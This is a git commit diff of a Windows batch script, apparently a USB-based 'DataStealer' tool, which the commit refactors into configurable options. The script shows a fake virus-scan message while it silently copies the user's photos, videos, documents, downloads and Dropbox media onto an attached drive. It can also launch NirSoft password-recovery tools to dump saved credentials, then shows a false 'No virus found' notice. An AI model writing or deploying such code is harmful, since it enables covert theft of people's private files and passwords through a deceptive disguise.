a7ea8e5f81c4106c13b3062485c034ccda3abb28
kevinsillo <lana_wifly_1992@hotmail.com>
2016-01-08 00:33:59 +0000

    U Optimizacion de run.bat

--- DataStealer/run.bat
+++ DataStealer/run.bat
@@ -1,34 +1,50 @@
 @echo off
 
-set drives= B D E F G H I J K L M N O P Q R S T U V W X Y Z
+REM ###############################################################
+REM ######################### OPTIONS #############################
+REM ###############################################################
 
-REM ############ Formats ############
-set rest= *.jpg,*.png,*.mp4,*.3gp,*.wav
-REM #################################
+set formats=*.jpg *.png *.mp4 *.3gp *.wav
+set msg1=true
+set msg2=true
+set msg1text=Analyzing USB device for searching virus.
+set msg2text=No virus found.
+set stealfiles=true
+set nirsoft=false
+set soft=
 
-MSG * Analizando USB en busca de virus.
+REM ---------------------------------------------------------------
 
-mkdir data\capt\%USERNAME%
-mkdir data\pss\%USERNAME%
+REM ###############################################################
+REM ############ DON'T TOUCH THIS, ONLY ADVANCED USERS ############
+REM ###############################################################
 
-FOR %%# IN (%DRIVES%) DO (If Exist "%%#:\" (FOR /R "%userprofile%\Mis documentos\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
+set drives=B D E F G H I J K L M N O P Q R S T U V W X Y Z
 
-REM ############ Folders ############
-FOR /R "%userprofile%\Pictures\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
-FOR /R "%userprofile%\Videos\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
-FOR /R "%userprofile%\Documents\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
-FOR /R "%userprofile%\Downloads\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
-FOR /R "%userprofile%\Dropbox\" %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
-
-REM #################################
-
+IF %msg1%==true (
+	MSG * %msg1text%
 )
+
+IF %stealfiles%==true (
+	MKDIR data\capt\%USERNAME%
+	FOR %%# IN (%DRIVES%) DO (IF Exist "%%#:\" (
+		FOR /R "%userprofile%\Pictures\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
+		FOR /R "%userprofile%\Videos\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
+		FOR /R "%userprofile%\Documents\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
+		FOR /R "%userprofile%\Downloads\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
+		FOR /R "%userprofile%\Dropbox\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
+	))
 )
 
-REM ############ Nirsoft ############
+IF %nirsoft%==true (
+	MKDIR data\pss\%USERNAME%
+	FOR %%I IN (%soft%) DO (
+		start data/soft/%%I.exe /shtml "data\pss\%USERNAME%\%%I.html"
+	)
+)
 
-REM #################################
-
-MSG * Ningun virus encontrado.
+IF %msg2%==true (
+	MSG * %msg2text%
+)
 
 exit
